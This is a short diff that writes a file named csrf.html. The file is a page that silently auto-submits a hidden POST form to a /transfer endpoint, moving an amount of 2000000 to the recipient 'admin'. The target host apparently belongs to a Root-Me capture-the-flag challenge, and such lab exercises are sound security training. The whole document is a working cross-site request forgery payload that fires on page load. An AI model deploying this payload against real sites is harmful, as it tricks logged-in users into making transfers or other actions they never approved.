@@ -1,0 +1,14 @@
+cat > csrf.html <<'EOF'
+<!DOCTYPE html>
+<html>
+<body>
+<form id="attack" action="https://instance-01a13bac-3418-7380-97fd-d62d4cccc63d.challenges.root-me.pro/transfer" method="POST">
+  <input type="hidden" name="recipient" value="admin">
+  <input type="hidden" name="amount" value="2000000">
+</form>
+<script>
+  document.getElementById("attack").submit();
+</script>
+</body>
+</html>
+EOF
